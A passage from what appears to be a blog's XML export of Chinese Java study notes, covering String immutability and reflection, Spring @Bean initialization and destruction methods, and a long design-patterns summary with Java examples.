+ s); //Hello World //获取String类中的value字段 Field valueFieldOfString = String.class.getDeclaredField("value"); //改变value属性的访问权限 valueFieldOfString.setAccessible(true); //获取s对象上的value属性的值 char[] value = (char[]) valueFieldOfString.get(s); //改变value所引用的数组中的第5个字符 value[5] = '_'; System.out.println("s = " + s); //Hello_World &#125; 在这个过程中，s始终引用的同一个String对象，但是再反射前后，这个String对象发生了变化， 也就是说，通过反射是可以修改所谓的“不可变”对象的。但是一般我们不这么做。这个反射的实例还可以说明一个问题：如果一个对象，他组合的其他对象的状态是可以改变的，那么这个对象很可能不是不可变对象。例如一个Car对象，它组合了一个Wheel对象，虽然这个Wheel对象声明成了private final 的，但是这个Wheel对象内部的状态可以改变， 那么就不能很好的保证Car对象不可变。 参考： https://blog.csdn.net/zhangjg_blog/article/details/18319521]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.@Bean指定初始化和销毁方法]]></title>
    <url>%2F2018%2F07%2F21%2F10.%40Bean%E6%8C%87%E5%AE%9A%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E9%94%80%E6%AF%81%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[学习bean的初始化和销毁等。 bean生命周期：bean创建—-初始化—-销毁的过程 容器管理bean的生命周期，我们可以自定义初始化和销毁方法，容器在bean进行到当前生命周期的时候来调用我们自定义的初始化和销毁方法。 指定初始化和销毁方法 用xml配置的方式，可以指定init-method和destory-method； 那么注解如何做到自定义的初始化和销毁方法呢？ 我们先来创建一个Dog的类: 12345678910111213public class Dog &#123; public Dog()&#123; System.out.println("Dog constructor...."); &#125; public void init()&#123; System.out.println("Dog init..."); &#125; public void destory()&#123; System.out.println("Dog destory..."); &#125;&#125; 写一个配置类来注册这个Dog： 12345678@Configurationpublic class MainConfigOfLifeCycle &#123; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; 先来启动容器： 12345@Testpublic void test01()&#123; AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfLifeCycle.class); System.out.println("容器已经启动成功...");&#125; 那么打印结果是： 12Dog constructor....容器已经启动成功... 那如何指定我们自定义的初始化和销毁方法呢？ 首先修改一下测试方法，增加一句关闭容器： 123456@Testpublic void test01()&#123; AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfLifeCycle.class); System.out.println("容器已经启动成功..."); applicationContext.close();&#125; 然后在@Bean注解上指定初始化方法和销毁方法： @Bean(initMethod = “init”,destroyMethod = “destory”) 再次启动，显示： 1234Dog constructor....Dog init...容器已经启动成功...Dog destory... 但是注意单例和多例的区别，现在我将其配置成多例，由于多例是每次访问才会创建bean，所以我们还需要访问一下。 最后的打印结果是： 12345容器已经启动成功...Dog constructor....五月 28, 2018 3:49:33 下午 org.springframework.context.annotation.AnnotationConfigApplicationContext doClose信息: Closing org.springframework.context.annotation.AnnotationConfigApplicationContext@16f65612: startup date [Mon May 28 15:49:32 CST 2018]; root of context hierarchyDog init... 说明在多例的情况下，容器最后不会销毁这个bean。 总结一下： 注解如何指定bean的初始化和销毁：@Bean注解后面指定init-method和destory-method 初始化：对象创建完成之后，并赋值好，在调用初始化方法 销毁方法：单例：容器关闭的时候销毁；多例：容器不会管理这个bean，容器不会调用销毁方法]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.设计模式汇总]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[设计模式汇总。 一、概述设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。 拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。 二、创建型1. 单例（Singleton）意图确保一个类只有一个实例，并提供该实例的全局访问点。 类图使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。 私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。 实现（一）懒汉式-线程不安全 以下实现中，私有静态变量 uniqueInstance 被延迟化实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。 这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 if (uniqueInstance == null) ，并且此时 uniqueInstance 为 null，那么多个线程会执行 uniqueInstance = new Singleton(); 语句，这将导致多次实例化 uniqueInstance。 1234567891011121314public class Singleton &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; （二）懒汉式-线程安全 只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了对 uniqueInstance 进行多次实例化的问题。 但是这样有一个问题，就是当一个线程进入该方法之后，其它线程试图进入该方法都必须等待，因此性能上有一定的损耗。 123456public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance;&#125; （三）饿汉式-线程安全 线程不安全问题主要是由于 uniqueInstance 被实例化了多次，如果 uniqueInstance 采用直接实例化的话，就不会被实例化多次，也就不会产生线程不安全问题。但是直接实例化的方式也丢失了延迟实例化带来的节约资源的优势。 1private static Singleton uniqueInstance = new Singleton(); （四）双重校验锁-线程安全 uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行。也就是说，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。 双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。 123456789101112131415161718public class Singleton &#123; private volatile static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; &#125; &#125; return uniqueInstance; &#125;&#125; 考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程同时执行 if 语句，那么两个线程就会同时进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 uniqueInstance = new Singleton(); 这条语句，只是先后的问题，也就是说会进行两次实例化，从而产生了两个实例。因此必须使用双重校验锁，也就是需要使用两个 if 判断。 12345if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; uniqueInstance = new Singleton(); &#125;&#125; uniqueInstance 采用 volatile 关键字修饰也是很有必要的。uniqueInstance = new Singleton(); 这段代码其实是分为三步执行。 分配内存空间 初始化对象 将 uniqueInstance 指向分配的内存地址 但是由于 JVM 具有指令重排的特性，有可能执行顺序变为了 1&gt;3&gt;2，这在单线程情况下自然是没有问题。但如果是多线程下，有可能获得是一个还没有被初始化的实例，以致于程序出错。 使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。 （五）枚举实现 这是单例模式的最佳实践，它实现简单，并且在面对复杂的序列化或者反射攻击的时候，能够防止实例化多次。 123public enum Singleton &#123; uniqueInstance;&#125; 考虑以下单例模式的实现，该 Singleton 在每次序列化的时候都会创建一个新的实例，为了保证只创建一个实例，必须声明所有字段都是 transient，并且提供一个 readResolve() 方法。 1234567891011121314public class Singleton implements Serializable &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; 如果不使用枚举来实现单例模式，会出现反射攻击，因为通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象。如果要防止这种攻击，需要在构造函数中添加防止实例化第二个对象的代码。 从上面的讨论可以看出，解决序列化和反射攻击很麻烦，而枚举实现不会出现这两种问题，所以说枚举实现单例模式是最佳实践。 使用场景 Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons JDK java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager() 2. 简单工厂（Simple Factory）意图在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。 类图简单工厂不是设计模式，更像是一种编程习惯。它把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个子类来实例化。 这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。因为客户类往往有多个，如果不使用简单工厂，所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。 如果存在下面这种代码，就需要使用简单工厂将对象实例化的部分放到简单工厂中。 12345678910111213public class Client &#123; public static void main(String[] args) &#123; int type = 1; Product product; if (type == 1) &#123; product = new ConcreteProduct1(); &#125; else if (type == 2) &#123; product = new ConcreteProduct2(); &#125; else &#123; product = new ConcreteProduct(); &#125; &#125;&#125; 实现12public interface Product &#123;&#125; 12public class ConcreteProduct implements Product &#123;&#125; 12public class ConcreteProduct1 implements Product &#123;&#125; 12public class ConcreteProduct2 implements Product &#123;&#125; 12345678910public class SimpleFactory &#123; public Product createProduct(int type) &#123; if (type == 1) &#123; return new ConcreteProduct1(); &#125; else if (type == 2) &#123; return new ConcreteProduct2(); &#125; return new ConcreteProduct(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); &#125;&#125; 3. 工厂方法（Factory Method）意图定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化推迟到子类。 类图在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。 下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。 实现1234567public abstract class Factory &#123; abstract public Product factoryMethod(); public void doSomething() &#123; Product product = factoryMethod(); // do something with the product &#125;&#125; 12345public class ConcreteFactory extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct(); &#125;&#125; 12345public class ConcreteFactory1 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct1(); &#125;&#125; 12345public class ConcreteFactory2 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct2(); &#125;&#125; JDK java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext 4. 抽象工厂（Abstract Factory）意图提供一个接口，用于创建 相关的对象家族 。 类图抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。 抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。 至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。 从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。 代码实现12public class AbstractProductA &#123;&#125; 12public class AbstractProductB &#123;&#125; 12public class ProductA1 extends AbstractProductA &#123;&#125; 12public class ProductA2 extends AbstractProductA &#123;&#125; 12public class ProductB1 extends AbstractProductB &#123;&#125; 12public class ProductB2 extends AbstractProductB &#123;&#125; 1234public abstract class AbstractFactory &#123; abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();&#125; 123456789public class ConcreteFactory1 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA1(); &#125; AbstractProductB createProductB() &#123; return new ProductB1(); &#125;&#125; 123456789public class ConcreteFactory2 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA2(); &#125; AbstractProductB createProductB() &#123; return new ProductB2(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB &#125;&#125; JDK javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory 5. 生成器（Builder）意图封装一个对象的构造过程，并允许按步骤构造。 类图 实现以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。 12345678910111213141516171819202122232425262728293031323334public class AbstractStringBuilder &#123; protected char[] value; protected int count; public AbstractStringBuilder(int capacity) &#123; count = 0; value = new char[capacity]; &#125; public AbstractStringBuilder append(char c) &#123; ensureCapacityInternal(count + 1); value[count++] = c; return this; &#125; private void ensureCapacityInternal(int minimumCapacity) &#123; // overflow-conscious code if (minimumCapacity - value.length &gt; 0) expandCapacity(minimumCapacity); &#125; void expandCapacity(int minimumCapacity) &#123; int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity &lt; 0) newCapacity = minimumCapacity; if (newCapacity &lt; 0) &#123; if (minimumCapacity &lt; 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; &#125; value = Arrays.copyOf(value, newCapacity); &#125;&#125; 1234567891011public class StringBuilder extends AbstractStringBuilder &#123; public StringBuilder() &#123; super(16); &#125; @Override public String toString() &#123; // Create a copy, don't share the array return new String(value, 0, count); &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i &lt; count; i++) &#123; sb.append((char) ('a' + i)); &#125; System.out.println(sb.toString()); &#125;&#125; 1abcdefghijklmnopqrstuvwxyz JDK java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders 6. 原型模式（Prototype）意图使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。 类图 实现123public abstract class Prototype &#123; abstract Prototype myClone();&#125; 123456789101112131415161718public class ConcretePrototype extends Prototype &#123; private String filed; public ConcretePrototype(String filed) &#123; this.filed = filed; &#125; @Override Prototype myClone() &#123; return new ConcretePrototype(filed); &#125; @Override public String toString() &#123; return filed; &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); &#125;&#125; 1abc JDK java.lang.Object#clone() 三、行为型1. 责任链（Chain Of Responsibility）意图使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。 类图 Handler：定义处理请求的接口，并且实现后继链（successor） 实现123456789public abstract class Handler &#123; protected Handler successor; public Handler(Handler successor) &#123; this.successor = successor; &#125; protected abstract void handleRequest(Request request);&#125; 12345678910111213141516public class ConcreteHandler1 extends Handler &#123; public ConcreteHandler1(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type1) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 12345678910111213141516public class ConcreteHandler2 extends Handler&#123; public ConcreteHandler2(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type2) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 1234567891011121314151617public class Request &#123; private RequestType type; private String name; public Request(RequestType type, String name) &#123; this.type = type; this.name = name; &#125; public RequestType getType() &#123; return type; &#125; public String getName() &#123; return name; &#125;&#125; 123public enum RequestType &#123; type1, type2&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.type1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.type2, "request2"); handler2.handleRequest(request2); &#125;&#125; 12request1 is handle by ConcreteHandler1request2 is handle by ConcreteHandler2 JDK java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter() 2. 命令（Command）意图将命令封装成对象中，以便使用命令来参数化其它对象，或者将命令对象放入队列中进行排队，或者将命令对象的操作记录到日志中，以及支持可撤销的操作。 类图 Command：命令 Receiver：命令接收者，也就是命令真正的执行者 Invoker：通过它来调用命令 Client：可以设置命令与命令的接收者 实现设计一个遥控器，可以控制电灯开关。 123public interface Command &#123; void execute();&#125; 123456789101112public class LightOnCommand implements Command &#123; Light light; public LightOnCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.on(); &#125;&#125; 123456789101112public class LightOffCommand implements Command &#123; Light light; public LightOffCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.off(); &#125;&#125; 12345678910public class Light &#123; public void on() &#123; System.out.println("Light is on!"); &#125; public void off() &#123; System.out.println("Light is off!"); &#125;&#125; 1234567891011121314151617181920212223242526272829/** * 遥控器 */public class Invoker &#123; private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() &#123; this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; &#125; public void setOnCommand(Command command, int slot) &#123; onCommands[slot] = command; &#125; public void setOffCommand(Command command, int slot) &#123; offCommands[slot] = command; &#125; public void onButtonWasPushed(int slot) &#123; onCommands[slot].execute(); &#125; public void offButtonWasPushed(int slot) &#123; offCommands[slot].execute(); &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); &#125;&#125; JDK java.lang.Runnable Netflix Hystrix javax.swing.Action 3. 解释器（Interpreter）意图为语言创建解释器，通常由语言的语法和语法分析来定义。 类图 TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression Context：上下文，包含解释器之外的一些全局信息 实现以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。 例如一颗解析树为 D And (A Or (B C))，文本 “D A” 满足该解析树定义的规则。 这里的 Context 指的是 String。 123public abstract class Expression &#123; public abstract boolean interpret(String str);&#125; 12345678910111213141516171819public class TerminalExpression extends Expression &#123; private String literal = null; public TerminalExpression(String str) &#123; literal = str; &#125; public boolean interpret(String str) &#123; StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) &#123; String test = st.nextToken(); if (test.equals(literal)) &#123; return true; &#125; &#125; return false; &#125;&#125; 1234567891011121314public class AndExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) &amp;&amp; expression2.interpret(str); &#125;&#125; 12345678910111213public class OrExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) || expression2.interpret(str); &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; /** * 构建解析树 */ public static Expression buildInterpreterTree() &#123; // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); &#125; public static void main(String[] args) &#123; Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); &#125;&#125; 12truefalse JDK java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver 4. 迭代器（Iterator）意图提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。 类图 Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator； Iterator 主要定义了 hasNext() 和 next() 方法。 Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。 实现123public interface Aggregate &#123; Iterator createIterator();&#125; 12345678910111213141516public class ConcreteAggregate implements Aggregate &#123; private Integer[] items; public ConcreteAggregate() &#123; items = new Integer[10]; for (int i = 0; i &lt; items.length; i++) &#123; items[i] = i; &#125; &#125; @Override public Iterator createIterator() &#123; return new ConcreteIterator&lt;Integer&gt;(items); &#125;&#125; 12345public interface Iterator&lt;Item&gt; &#123; Item next(); boolean hasNext();&#125; 12345678910111213141516171819public class ConcreteIterator&lt;Item&gt; implements Iterator &#123; private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) &#123; this.items = items; &#125; @Override public Object next() &#123; return items[position++]; &#125; @Override public boolean hasNext() &#123; return position &lt; items.length; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Aggregate aggregate = new ConcreteAggregate(); Iterator&lt;Integer&gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) &#123; System.out.println(iterator.next()); &#125; &#125;&#125; JDK java.util.Iterator java.util.Enumeration 5. 中介者（Mediator）意图集中相关对象之间复杂的沟通和控制方式。 类图 Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。 Colleague：同事，相关对象 实现Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构： 使用中介者模式可以将复杂的依赖结构变成星形结构： 123public abstract class Colleague &#123; public abstract void onEvent(Mediator mediator);&#125; 1234567891011public class Alarm extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("alarm"); &#125; public void doAlarm() &#123; System.out.println("doAlarm()"); &#125;&#125; 12345678910public class CoffeePot extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("coffeePot"); &#125; public void doCoffeePot() &#123; System.out.println("doCoffeePot()"); &#125;&#125; 12345678910public class Calender extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("calender"); &#125; public void doCalender() &#123; System.out.println("doCalender()"); &#125;&#125; 12345678910public class Sprinkler extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("sprinkler"); &#125; public void doSprinkler() &#123; System.out.println("doSprinkler()"); &#125;&#125; 123public abstract class Mediator &#123; public abstract void doEvent(String eventType);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class ConcreteMediator extends Mediator &#123; private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) &#123; this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; &#125; @Override public void doEvent(String eventType) &#123; switch (eventType) &#123; case "alarm": doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); &#125; &#125; public void doAlarmEvent() &#123; alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); &#125; public void doCoffeePotEvent() &#123; // ... &#125; public void doCalenderEvent() &#123; // ... &#125; public void doSprinklerEvent() &#123; // ... &#125;&#125; 1234567891011public class Client &#123; public static void main(String[] args) &#123; Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // 闹钟事件到达，调用中介者就可以操作相关对象 alarm.onEvent(mediator); &#125;&#125; 1234doAlarm()doCoffeePot()doCalender()doSprinkler() JDK All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke() 6. 备忘录（Memento）意图在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。 类图 Originator：原始对象 Caretaker：负责保存好备忘录 Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。 实现以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。 实现参考：Memento Pattern - Calculator Example - Java Sourcecode 1234567891011121314151617/** * Originator Interface */public interface Calculator &#123; // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);&#125; 123456789101112131415161718192021222324252627282930313233343536/** * Originator Implementation */public class CalculatorImp implements Calculator &#123; private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() &#123; // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); &#125; @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) &#123; this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); &#125; @Override public int getCalculationResult() &#123; // result is adding two numbers return firstNumber + secondNumber; &#125; @Override public void setFirstNumber(int firstNumber) &#123; this.firstNumber = firstNumber; &#125; @Override public void setSecondNumber(int secondNumber) &#123; this.secondNumber = secondNumber; &#125;&#125; 123456789/** * Memento Interface to Originator * * This interface allows the originator to restore its state */public interface PreviousCalculationToOriginator &#123; int getFirstNumber(); int getSecondNumber();&#125; 123456/** * Memento interface to CalculatorOperator (Caretaker) */public interface PreviousCalculationToCareTaker &#123; // no operations permitted for the caretaker&#125; 1234567891011121314151617181920212223242526/** * Memento Object Implementation * &lt;p&gt; * Note that this object implements both interfaces to Originator and CareTaker */public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator &#123; private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) &#123; this.firstNumber = firstNumber; this.secondNumber = secondNumber; &#125; @Override public int getFirstNumber() &#123; return firstNumber; &#125; @Override public int getSecondNumber() &#123; return secondNumber; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435/** * CareTaker object */public class Client &#123; public static void main(String[] args) &#123; // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); &#125;&#125; 123110-273110 JDK java.io.Serializable 7. 观察者（Observer）意图定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。 主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。 类图主题（Subject）具有注册和移除观察者、并通知所有注册者的功能，主题是通过维护一张观察者列表来实现这些操作的。 观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。 实现天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。 1234567public interface Subject &#123; void resisterObserver(Observer o); void removeObserver(Observer o); void notifyObserver();&#125; 12345678910111213141516171819202122232425262728293031323334353637383940import java.util.ArrayList;import java.util.List;public class WeatherData implements Subject &#123; private List&lt;Observer&gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() &#123; observers = new ArrayList&lt;&gt;(); &#125; public void setMeasurements(float temperature, float humidity, float pressure) &#123; this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); &#125; @Override public void resisterObserver(Observer o) &#123; observers.add(o); &#125; @Override public void removeObserver(Observer o) &#123; int i = observers.indexOf(o); if (i &gt;= 0) &#123; observers.remove(i); &#125; &#125; @Override public void notifyObserver() &#123; for (Observer o : observers) &#123; o.update(temperature, humidity, pressure); &#125; &#125;&#125; 123public interface Observer &#123; void update(float temp, float humidity, float pressure);&#125; 1234567891011public class StatisticsDisplay implements Observer &#123; public StatisticsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 1234567891011public class CurrentConditionsDisplay implements Observer &#123; public CurrentConditionsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 12345678910public class WeatherStation &#123; public static void main(String[] args) &#123; WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); &#125;&#125; 1234CurrentConditionsDisplay.update: 0.0 0.0 0.0StatisticsDisplay.update: 0.0 0.0 0.0CurrentConditionsDisplay.update: 1.0 1.0 